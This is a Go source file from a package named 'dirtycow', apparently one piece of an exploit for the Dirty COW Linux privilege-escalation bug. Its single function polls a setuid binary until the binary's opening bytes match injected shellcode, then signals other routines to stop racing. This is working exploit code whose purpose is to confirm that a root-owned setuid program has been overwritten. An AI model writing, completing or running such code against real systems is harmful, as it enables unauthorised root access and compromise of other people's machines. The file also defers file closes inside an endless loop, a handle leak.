package dirtycow

import "bytes"
import "os"
import "time"

func await_payload(suid_binary string, shellcode []byte) bool {

	var result bool = false

	tmp := make([]byte, len(shellcode))

	for true {

		file, err1 := os.OpenFile(suid_binary, os.O_RDONLY, 0600)

		if err1 == nil {

			_, err2 := file.Read(tmp)

			if err2 == nil {

				if bytes.Compare(tmp, shellcode) == 0 {
					result = true
					break
				}

			}

			defer file.Close()

		}

		time.Sleep(1 * time.Second)

	}

	signals <- true
	signals <- true

	return result

}
